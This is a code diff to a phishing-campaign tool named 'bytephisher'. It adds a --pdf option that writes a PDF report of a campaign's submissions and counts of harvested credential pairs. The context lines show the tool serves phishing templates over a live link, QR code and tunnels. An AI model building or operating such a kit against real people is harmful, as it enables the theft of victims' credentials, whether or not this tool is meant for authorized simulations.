@@ -166,6 +166,9 @@ def main():
                     help="save a QR code PNG of the live link (default data/qr.png)")
     ap.add_argument("--report", metavar="PATH",
                     help="write a self-contained HTML campaign report and exit")
+    ap.add_argument("--pdf", metavar="PATH",
+                    help="write a dark-theme PDF campaign report (CONFIRMED/SUSPECTED "
+                         "labels) and exit")
     ap.add_argument("--rotate", metavar="SLUGS",
                     help="serve a random one of these templates per request "
                          "(comma-separated slugs) — A/B style campaigns")
@@ -207,6 +210,19 @@ def main():
                            qr_url=args.qr and args.qr not in ("data/qr.png",) and args.qr or None)
         print(f"[bytephisher] report written -> {res['path']}")
         print(f"[bytephisher] rows: {res['rows']}  stats: {res['stats']}")
+        return 0
+
+    if args.pdf:
+        try:
+            from tools.report_pdf import build_report_pdf
+        except ImportError as e:
+            print(f"[bytephisher] PDF needs reportlab+pypdf ({e}). "
+                  f"Install: ./.venv/bin/pip install reportlab pypdf")
+            return 2
+        res = build_report_pdf(cfg["db_path"], args.pdf, campaign=args.campaign,
+                              qr_url=args.qr if args.qr and args.qr != "data/qr.png" else None)
+        print(f"[bytephisher] pdf written -> {res['path']} ({res['pages']} pages, "
+              f"{res['rows']} submissions, {res['stats']['credentials']} credential pairs)")
         return 0
 
     if args.tunnels:
